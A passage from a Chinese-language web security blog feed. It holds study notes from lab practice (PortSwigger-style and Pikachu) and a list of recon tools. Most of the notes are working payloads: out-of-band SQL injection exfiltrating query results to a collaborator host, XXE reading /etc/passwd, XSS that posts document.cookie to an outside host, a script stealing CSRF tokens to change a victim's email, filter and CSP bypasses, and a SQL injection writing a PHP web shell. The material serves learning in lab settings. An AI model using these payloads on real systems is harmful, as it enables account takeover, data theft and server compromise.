class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Oracle:  SELECT EXTRACTVALUE (xmltype (&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">            &lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#x27;||(SELECT YOUR-QUERY-HERE)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; % remote;]&gt;&#x27;),&#x27;/l&#x27;) </span><br><span class=\"line\">            FROM dual</span><br><span class=\"line\">Microsoft: declare @p varchar (1024);set @p=(SELECT YOUR-QUERY-HERE);exec (&#x27;master..xp_dirtree &quot;//&#x27;+@p+&#x27;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#x27;)</span><br><span class=\"line\">PostgreSQL: create OR replace function f () returns void as $$</span><br><span class=\"line\">                   declare c text;</span><br><span class=\"line\">                   declare p text;</span><br><span class=\"line\">                   begin</span><br><span class=\"line\">                   SELECT into p (SELECT YOUR-QUERY-HERE);</span><br><span class=\"line\">                   c := &#x27;copy (SELECT &#x27;&#x27;&#x27;&#x27;) to program &#x27;&#x27;nslookup &#x27;||p||&#x27;.BURP-COLLABORATOR-SUBDOMAIN&#x27;&#x27;&#x27;;</span><br><span class=\"line\">                   execute c;</span><br><span class=\"line\">                   END;</span><br><span class=\"line\">                   $$ language plpgsql security definer;</span><br><span class=\"line\">                   SELECT f ();</span><br><span class=\"line\">MySQL: SELECT YOUR-QUERY-HERE INTO OUTFILE &#x27;\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#x27;（仅在 windows 有用）</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>可以用简单的 +,- 来判断某些数字参数是否会被后台执行。</p>\n</li>\n<li>\n<p>当返回只能有一列而结果有多列时，可以考虑以下方法将多列拼成一列。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">SELECT username || &#x27;~&#x27; || password FROM users</span><br></pre></td></tr></table></figure></p>\n</li>\n</ol>\n<h3 id=\"xxe\"><a class=\"anchor\" href=\"#xxe\">#</a> XXE</h3>\n<ol>\n<li>一段简单的 XML payload，用来展示 xml 格式。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE xxe [ </span><br><span class=\"line\">&lt;!ELEMENT name ANY &gt; </span><br><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:/etc/passwd&quot; &gt;]&gt; </span><br><span class=\"line\">&lt;name&gt;&amp;xxe;&lt;/name&gt; </span><br></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"xss\"><a class=\"anchor\" href=\"#xss\">#</a> XSS</h3>\n<p>0.payload 汇总。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;img src=&quot;1&quot; onerror=alert (1)&gt;</span><br><span class=\"line\">&lt;svg onload=alert (1)&gt;</span><br><span class=\"line\">javascript:alert (document.cookie)</span><br><span class=\"line\">&quot;onmouseover=&quot;alert (1)</span><br><span class=\"line\">&#x27;-alert (1)-&#x27;</span><br><span class=\"line\">$on.constructor (&#x27;alert (1)&#x27;)()</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">fetch (&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;, &#123;</span><br><span class=\"line\">method: &#x27;POST&#x27;,</span><br><span class=\"line\">mode: &#x27;no-cors&#x27;,</span><br><span class=\"line\">body:document.cookie</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var req = new XMLHttpRequest ();</span><br><span class=\"line\">req.onload = handleResponse;</span><br><span class=\"line\">req.open (&#x27;get&#x27;,&#x27;/my-account&#x27;,true);</span><br><span class=\"line\">req.send ();</span><br><span class=\"line\">function handleResponse () &#123;</span><br><span class=\"line\">    var token = this.responseText.match (/name=&quot;csrf&quot; value=&quot;(\\w+)&quot;/)[1];</span><br><span class=\"line\">    var changeReq = new XMLHttpRequest ();</span><br><span class=\"line\">    changeReq.open (&#x27;post&#x27;, &#x27;/my-account/change-email&#x27;, true);</span><br><span class=\"line\">    changeReq.send (&#x27;csrf=&#x27;+token+&#x27;&amp;email=test@test.com&#x27;)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;xss id=x onfocus=alert (document.cookie) tabindex=1&gt;</span><br><span class=\"line\">&lt;svg&gt;&lt;animatetransform onbegin=alert (1)&gt;</span><br><span class=\"line\">accesskey=&#x27;x&#x27;onclick=&#x27;alert (1)</span><br><span class=\"line\"></span><br><span class=\"line\"> 以下带绕过功能 </span><br><span class=\"line\">&lt;/script&gt;&lt;script&gt;alert (1)&lt;/script&gt;</span><br><span class=\"line\">\\&#x27;-alert (1)//</span><br><span class=\"line\">http://foo?&amp;apos;-alert (1)-&amp;apos;</span><br><span class=\"line\">$&#123;alert (1)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert (1)/&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</span><br><span class=\"line\">x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;&#x27;,&#123;x:&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">（AngularJS）：</span><br><span class=\"line\">toString ().constructor.prototype.charAt=[].join;[1]|orderBy:toString ().constructor.fromCharCode (120,61,97,108,101,114,116,40,49,41)=1 </span><br><span class=\"line\">&lt;input autofocus ng-focus=&quot;$event.path|orderBy:&#x27;[].constructor.from ([1],alert)&#x27;&quot;&gt; </span><br><span class=\"line\">[1].map (alert)</span><br><span class=\"line\">&lt;input id=x ng-focus=$event.path|orderBy:&#x27;(z=alert)(document.cookie)&#x27;&gt;#x</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&gt;&lt;img src=&#x27;//attacker-website.com?</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">if (window.name) &#123;</span><br><span class=\"line\">\tnew Image ().src=&#x27;subdomain//?&#x27;+encodeURIComponent (window.name);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tlocation = &#x27;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;alert (1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27;</span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>\n<p>使用以下代码，对使用了 innerHTML 的网页实现 DOM XSS 攻击，innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;img src=&quot;1&quot; onerror=alert (1)&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>一段 payload。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;svg onload=alert (1)&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>网页的代码可能会从 url 中获取参数，url 中的参数不一定都是传给后端的，通过修改这些参数可能触发 XSS。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">javascript:alert (document.cookie)</span><br></pre></td></tr></table></figure></p>\n</li>\n</ol>\n<p>4.DOM 型的 XSS，目前来看是通过在 html 中添加 img 或者 svg 等元素，然后通过触发其中的 onerror 等属性来运行自己的 payload。<br />\n5. 为什么使用 HTML 编码能预防 XSS 攻击。<br />\nHTML 在解析时存在多种状态，在这个问题中需要了解 &quot;Tag open state&quot;, &quot;Tag name state&quot; 和 &quot;Data state&quot;,HTML 初始为 &quot;Data state&quot;, 在遇到第一个 &lt; 后进入 &quot;Tag open state&quot;, 之后在遇到第一个字符时<br />\n进入 &quot;Tag name state&quot;，直到遇到 &gt; 结束。当我们的 XSS 代码（比如 &lt;script&gt;alert ()&lt;/script&gt;）被 HTML 编码后，HTML 遇到被编码后的 &lt;，不会进入 &quot;Tag open state&quot;，而是会保持 &quot;Data state&quot; 并对其解码，因此 &lt; script &gt; 标签不会发挥作用。<br />\n6. 使用以下代码绕过 html 编码保护， 仅在 DOM 中有用：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&quot;onmouseover=&quot;alert (1)</span><br></pre></td></tr></table></figure><br />\n7. 一种新的 payload, 用于封闭 script 中变量的 ''。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&#x27;-alert (1)-&#x27;</span><br></pre></td></tr></table></figure><br />\n8. 有的变量里面也可以变成 payload，比如 a=b，但是如果只是修改 b 不能造成 xss，因为编译器只会将 payload 赋给 a，需要用一些符号让 payload 执行才行。之前的 sql 注入也有这种问题。<br />\n9.window.location 对象所包含的属性。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">hash: 从井号开始的 URL</span><br><span class=\"line\">host: 主机名和当前 URL 的端口号 </span><br><span class=\"line\">hostname: 当前 URL 的主机名 </span><br><span class=\"line\">href: 完整的 URL</span><br><span class=\"line\">pathname: 当前 URL 的路径部分 </span><br><span class=\"line\">port: 当前 URL 的端口号 </span><br><span class=\"line\">protocol: 当前 URL 的协议 </span><br><span class=\"line\">search: 从问号开始的 URL</span><br></pre></td></tr></table></figure><br />\n10. 一种新的 payload。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$on.constructor (&#x27;alert (1)&#x27;)()</span><br></pre></td></tr></table></figure></p>\n<p>11.AngularJS 是一个 js 框架，当有 ng-app 属性的 html 元素的内容被更改是，会执行 {分隔符 {分隔符} 分隔符} 的内容（分隔符当不存在，不加这个 hexo 报错）。<br />\n12.js 文件中存在变量赋值的地方需要注意，可以通过修改变量赋值，让其变成包含指令的运算，从而达到执行指令的目的。</p>\n<ol start=\"13\">\n<li>\n<p>用于获取 cookie 的 payload<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">fetch (&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;, &#123;</span><br><span class=\"line\">method: &#x27;POST&#x27;,</span><br><span class=\"line\">mode: &#x27;no-cors&#x27;,</span><br><span class=\"line\">body:document.cookie</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>使用在 CSRF 中学到的基础绕过，依旧没有绕过 token，使用以下 XSS 的 payload 可以获取用户的 token。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var req = new XMLHttpRequest ();</span><br><span class=\"line\">req.onload = handleResponse;</span><br><span class=\"line\">req.open (&#x27;get&#x27;,&#x27;/my-account&#x27;,true);</span><br><span class=\"line\">req.send ();</span><br><span class=\"line\">function handleResponse () &#123;</span><br><span class=\"line\">    var token = this.responseText.match (/name=&quot;csrf&quot; value=&quot;(\\w+)&quot;/)[1];</span><br><span class=\"line\">    var changeReq = new XMLHttpRequest ();</span><br><span class=\"line\">    changeReq.open (&#x27;post&#x27;, &#x27;/my-account/change-email&#x27;, true);</span><br><span class=\"line\">    changeReq.send (&#x27;csrf=&#x27;+token+&#x27;&amp;email=test@test.com&#x27;)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>通过 burp intruder 配合 XSS cheat sheet 绕过 WAF，主要是通过字典找到 WAF 遗漏的标签和指令，从而根据这些漏洞实现攻击。</p>\n</li>\n<li>\n<p>一种新的触发方法：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;xss id=x onfocus=alert (document.cookie) tabindex=1&gt;</span><br></pre></td></tr></table></figure><br />\ntabindex 将该标签设置为可以聚焦，之后可以在 URL 结尾处使用 #x 聚焦该标签，从而触发 onfocus 事件。</p>\n</li>\n<li>\n<p>一段 payload：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;svg&gt;&lt;animatetransform onbegin=alert (1)&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>rel=&quot;canonical&quot; 标签用于解决由于网址形式不同而内容相同造成的内容重复问题，各大搜索引擎只显示该标签后续跟的 href 指定的 url。</p>\n</li>\n<li>\n<p>一种 payload。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">accesskey=&#x27;x&#x27;onclick=&#x27;alert (1)</span><br></pre></td></tr></table></figure><br />\naccesskey 属性用来指定使元素获得焦点的快捷键。</p>\n</li>\n<li>\n<p>目前见过两种绕过 \\ 的方法，一种是重复标签，一种是提前闭合。</p>\n</li>\n<li>\n<p>HTML 对标签标签和 &amp; apos; 先处理，之后才会有 javascript 进行处理，可以利用这一特性实现绕过。<br />\n22.JavaScript template literal 的特征使  <code>string</code> ，如果 `` 之间包含 ${code}，就会执行 code。</p>\n</li>\n<li>\n<p>遇到 script 标签后，html 会停止解析并交给 javascript 解析，直到运行完毕。</p>\n</li>\n<li>\n<p>使用 /**/ 来代替空格。</p>\n</li>\n<li>\n<p>不带括弧调用函数。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;&#123;onerror=alert&#125;throw 1337&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;throw onerror=alert,&#x27;some string&#x27;,123,&#x27;haha&#x27;&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;&#123;onerror=eval&#125;throw&#x27;=alert\\x281337\\x29&#x27;&lt;/script&gt;   Chrome</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;&#123;onerror=eval&#125;throw&#123;lineNumber:1,columnNumber:1,fileName:1,message:&#x27;alert\\x281\\x29&#x27;&#125;&lt;/script&gt;  Firefox </span><br><span class=\"line\">&lt;script&gt;&#123;onerror=prompt&#125;throw&#123;lineNumber:1,columnNumber:1,fileName:&#x27;second argument&#x27;,message:&#x27;first argument&#x27;&#125;&lt;/script&gt; Firefox</span><br><span class=\"line\">&lt;script&gt;TypeError.prototype.name =&#x27;=/&#x27;,0 [onerror=eval][&#x27;/-alert (1)//&#x27;]&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a [12]+[1337]+a [13]&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>小结。<br />\n当 XSS 在 HTML 的 tag 之间时，尝试引入新的 tag。<br />\n当 XSS 在 HTML 的 tag 属性中时：1. 尝试闭合 tag 并引入新的 tag。2. 尝试闭合属性并引入新的属性。3. 检查该属性本身能否触发 XSS。<br />\n当 XSS 在 JavaScript 中时：尝试闭合当前 script 标签并引入新的 script。<br />\n当 XSS 在 JS 中的字符串中时：1. 尝试闭合两边的引号。如果 JS 对其中的符号进行了转义（\\）, 可以尝试绕过 \\。有时 XSS 能使用的字段也会被限制，可以尝试一些特殊的注入方式。<br />\n当 XSS 处于 JS 中，并且这个 JS 处于 HTML tag 中：可以尝试使用 HTML 编码绕过。<br />\n当 XSS 处于 JS 模板字符串中：有特殊的执行方法。</p>\n</li>\n<li></li>\n</ol>\n<p>Dangling markup，一种逃脱标签并发起访问的方式。配合使用 <span class=\"exturl\" data-url=\"aHR0cDovL1dpbmRvdy5uYW1l\">Window.name</span> 为表单和超链接提供目标，从而绕过 CSP。<br />\n28.<br />\nHTML 中的 input 如果有 name 属性，那就可以通过 get 传值，数据就会被提交到表单里，但是还不会发包。<br />\n29. 绕过 edge 的 csp<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.paypal.com/webapps/xoonboarding?values=etc&amp;token=SOMETOKEN;_</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"csrf-跨站请求攻击\"><a class=\"anchor\" href=\"#csrf-跨站请求攻击\">#</a> CSRF (跨站请求攻击)</h3>\n<ol>\n<li>第一道题是使用的 burp 自带的 payload 生成工具，生成的 payload 如下。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  &lt;body&gt;</span><br><span class=\"line\">  &lt;script&gt;history.pushState (&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class=\"line\">    &lt;form action=&quot;URL&quot; method=&quot;POST&quot;&gt;</span><br><span class=\"line\">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;EMAIL_ADDRESS&quot; /&gt;</span><br><span class=\"line\">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">    &lt;script&gt;</span><br><span class=\"line\">      document.forms [0].submit ();</span><br><span class=\"line\">    &lt;/script&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li>\n<li>有的网页会检查 token，但更换下请求方式可能能绕过。</li>\n<li>更改要检查的 token 名可能也能绕过。</li>\n<li>可以考虑有的网站生成 token 后，没有和当前用户 session 绑定，因此如果当前 token 没有用于验证，可能会在后台持续存在。因此可以截获一段 request 并复制其 token，之后 drop 掉该 request，此时这段 token 便可用于 CSRF 包的构筑 ，因为没有与我的 session，victim 便<br />\n可以用这个 token 修改他自己的包。</li>\n<li>如果 token 与用户的 cookie 绑定，而用的 request 修改 session 后可能会导致用户退出，但修改 cookie 不会，则 cookie 可能并未与 session 绑定，因此可以尝试用 xss 漏洞配合 set-cookie 修改用户的 cookie，使其与自己的 payload 中的 token 一致。</li>\n</ol>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/11/15/information-collection/",
            "url": "http://ericcd.com/2022/11/15/information-collection/",
            "title": "information-collection",
            "date_published": "2022-11-15T13:57:34.000Z",
            "content_html": "<p>记录一些信息搜集工具。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"子域名收集\"><a class=\"anchor\" href=\"#子域名收集\">#</a> 子域名收集</h1>\n<p>1.Knockpy<br />\n2.Sublist3r<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzcg==\">https://github.com/aboul3la/Sublist3r</span><br />\n3.Google dorks<br />\n4.GoogDrker<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1plcGhyRmlzaC9Hb29nRDBya2Vy\">https://github.com/ZephrFish/GoogD0rker</span><br />\n5.Amass<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09XQVNQL0FtYXNz\">https://github.com/OWASP/Amass</span><br />\n6.curl<br />\n7. 自定义脚本</p>\n<p>#Web 指纹<br />\n 1.curl<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  curl -i -X OPTIONS url</span><br></pre></td></tr></table></figure><br />\n2.NMAP<br />\n3. 自定义脚本</p>\n<h1 id=\"应用识别\"><a class=\"anchor\" href=\"#应用识别\">#</a> 应用识别</h1>\n<p>1.Wappalyzer<br />\n2.Whatruns<br />\n3.WafW00f<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=\">https://github.com/EnableSecurity/wafw00f</span></p>\n<h1 id=\"目录扫描\"><a class=\"anchor\" href=\"#目录扫描\">#</a> 目录扫描</h1>\n<p>1.dirb<br />\n2.dirsearch<br />\n3.dir buster<br />\n4.nikto<br />\n5.Aquatone<br />\n6.burp intruder<br />\n7. 各类字典<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3Rz\"> https://github.com/danielmiessler/SecLists</span></p>\n<h1 id=\"隐藏参数发现\"><a class=\"anchor\" href=\"#隐藏参数发现\">#</a> 隐藏参数发现</h1>\n<p>1.Arjun<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bcmp1bg==\">https://github.com/UltimateHackers/Arjun</span></p>\n<h1 id=\"搜索引擎\"><a class=\"anchor\" href=\"#搜索引擎\">#</a> 搜索引擎</h1>\n<p>1.shodan<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># *country*: 找出指定国家的资产数据 </span><br><span class=\"line\"></span><br><span class=\"line\"># *hostname*: 找出指定主机名的资产数据 </span><br><span class=\"line\"></span><br><span class=\"line\"># *port*: 找出指定端口的资产数据 </span><br><span class=\"line\"></span><br><span class=\"line\"># *os*: 找出指定系统版本的资产数据 </span><br><span class=\"line\"></span><br><span class=\"line\"># *before/after*: 指定某个时期的资产数据 </span><br><span class=\"line\"></span><br><span class=\"line\"># *city*: 找出指定城市的资产数据 </span><br></pre></td></tr></table></figure><br />\n2.Censys</p>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/09/20/pikachu/",
            "url": "http://ericcd.com/2022/09/20/pikachu/",
            "title": "pikachu",
            "date_published": "2022-09-20T12:21:49.000Z",
            "content_html": "<p>记录一些在使用 pikahcu 练习时用到的命令。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"sql-注入\"><a class=\"anchor\" href=\"#sql-注入\">#</a> SQL 注入</h1>\n<ol>\n<li>获取数据库名<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># union select database ()</span><br></pre></td></tr></table></figure></li>\n<li>获取表名<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># union select group_concat (table_name) from information_schema.tables where table_schema=database ()</span><br></pre></td></tr></table></figure></li>\n<li>获取列名<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># union select group_concat (table_name) from information_schema.columns where table_name=&#x27; 表名 &#x27;</span><br></pre></td></tr></table></figure></li>\n<li>读文件<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># union select load_file (&#x27;Path&#x27;) from 表名 </span><br></pre></td></tr></table></figure></li>\n<li>写文件<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># union select &#x27;&lt;!php assert ($_POST [1];?)&gt;&#x27; into outfile &#x27;Path&#x27;</span><br></pre></td></tr></table></figure></li>\n<li>报错回显<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># and updatexml (1,concat (0x7e,(select database ()),0x7e),1))</span><br></pre></td></tr></table></figure></li>\n</ol>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/08/31/linux-command/",
            "url": "http://ericcd.com/2022/08/31/linux-command/",
            "title": "linux-command",
            "date_published": "2022-08-31T07:02:26.000Z",
